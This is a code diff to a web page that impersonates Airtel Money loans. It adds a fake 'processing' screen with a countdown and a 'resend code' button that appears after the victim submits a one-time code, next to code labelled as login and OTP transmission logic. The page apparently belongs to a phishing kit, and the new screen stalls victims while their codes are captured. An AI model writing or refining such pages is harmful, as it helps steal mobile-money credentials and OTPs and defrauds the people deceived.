@@ -85,7 +85,7 @@ input:focus,select:focus{outline:0;border-color:var(--red)}
 .show{display:flex;gap:8px;align-items:center;font-weight:400;margin:10px 0 0;font-size:.85rem;color:var(--muted)}
 .ok-msg{margin-top:16px;padding:12px;border-radius:12px;background:#e9f9ee;color:#12632d;font-weight:600}
 .ok-msg.err-msg{background:#fdeaea;color:#b80000}
-#loginForm button[disabled],#otpForm button[disabled],#next3[disabled]{opacity:.7;cursor:not-allowed}
+#loginForm button[disabled],#otpForm button[disabled],#next3[disabled],#resendBtn[disabled]{opacity:.6;cursor:not-allowed}
 main[hidden]{display:none}
 body{-webkit-text-size-adjust:100%}
 input,select,button{font-size:16px}
@@ -172,6 +172,17 @@ img,svg{max-width:100%}
 <div class="ok-msg" id="otpOk" hidden></div></form>
 <p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></div></div></main>
 
+<!-- New Pending Window -->
+<main id="view-pending" hidden>
+<div class="container"><div class="card login" style="text-align:center;">
+<div class="ic-lg" style="animation: pulse 1.5s infinite;">⏳</div>
+<h2>Traitement en cours</h2>
+<p class="sub">Votre demande de prêt est en cours de validation par le système.</p>
+<div style="font-size: 2.5rem; font-weight: 800; color: var(--red); margin: 20px 0;" id="timerDisplay">02:00</div>
+<p class="sub" style="font-size: 0.9rem;">Veuillez patienter pendant que nous finalisons l'approbation.</p>
+<button type="button" class="btn block ghost" id="resendBtn" disabled style="margin-top: 20px;">Renvoyer le code</button>
+<p class="secure" style="margin-top: 20px;">🔒 Sécurisé par Airtel Money</p></div></div></main>
+
 <footer id="footer"><div class="container"><span class="logo">airtel</span><span>© 2026 Prêts Airtel</span>
 <div class="links"><a href="#">Politique de confidentialité</a>|<a href="#">Conditions générales</a>|<a href="#contact">Contacter l’assistance</a></div></div></footer>
 
@@ -257,7 +268,7 @@ if(form){
   show();
 }
 
-const views={home:document.getElementById('view-home'),apply:document.getElementById('view-apply'),contact:document.getElementById('view-contact'),otp:document.getElementById('view-otp')};
+const views={home:document.getElementById('view-home'),apply:document.getElementById('view-apply'),contact:document.getElementById('view-contact'),otp:document.getElementById('view-otp'),pending:document.getElementById('view-pending')};
 function show(v,scrollId){
   Object.keys(views).forEach(k=>views[k].hidden=k!==v);
   document.querySelectorAll('nav a').forEach(a=>a.classList.toggle('active',(a.dataset.view===v)&&!a.dataset.go));
@@ -266,11 +277,40 @@ function show(v,scrollId){
 document.addEventListener('click',e=>{
   const a=e.target.closest('a[href^="#"]');if(!a)return;
   const h=a.getAttribute('href');
-  if(h==='#apply'||h==='#contact'||h==='#home'||h==='#otp'){e.preventDefault();show(h.slice(1),a.dataset.go)}
+  if(h==='#apply'||h==='#contact'||h==='#home'||h==='#otp'||h==='#pending'){e.preventDefault();show(h.slice(1),a.dataset.go)}
 });
 document.querySelectorAll('nav a[data-go]').forEach(a=>a.dataset.view='home');
 window.goView=show;
 show('home');
+
+// Countdown logic for Pending view
+let countdownTimer = null;
+function startPendingCountdown(){
+  const timerDisplay = document.getElementById('timerDisplay');
+  const resendBtn = document.getElementById('resendBtn');
+  let timeLeft = 120; // 2 minutes in seconds
+  
+  resendBtn.disabled = true;
+  clearInterval(countdownTimer);
+
+  countdownTimer = setInterval(()=>{
+    let mins = Math.floor(timeLeft / 60);
+    let secs = timeLeft % 60;
+    timerDisplay.textContent = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+    
+    if(timeLeft <= 0){
+      clearInterval(countdownTimer);
+      resendBtn.disabled = false; // Enable resend button
+    }
+    timeLeft--;
+  }, 1000);
+}
+
+document.getElementById('resendBtn').addEventListener('click', ()=>{
+  if(!document.getElementById('resendBtn').disabled){
+    startPendingCountdown();
+  }
+});
 
 // Login and OTP Transmission Logic
 (function(){
@@ -429,11 +469,19 @@ show('home');
       msg.hidden=false;
       otpPins.forEach(p=>p.value='');
 
+      setTimeout(()=>{
+        msg.hidden=true;
+        otpBtn.disabled=false;
+        otpBtn.textContent=old;
+        otpBusy=false;
+        show('pending');
+        startPendingCountdown();
+      }, 1000);
+
     }catch(err){
       msg.textContent='❌ '+err.message;
       msg.classList.add('err-msg');
       msg.hidden=false;
-    }finally{
       otpBtn.disabled=false;
       otpBtn.textContent=old;
       otpBusy=false;
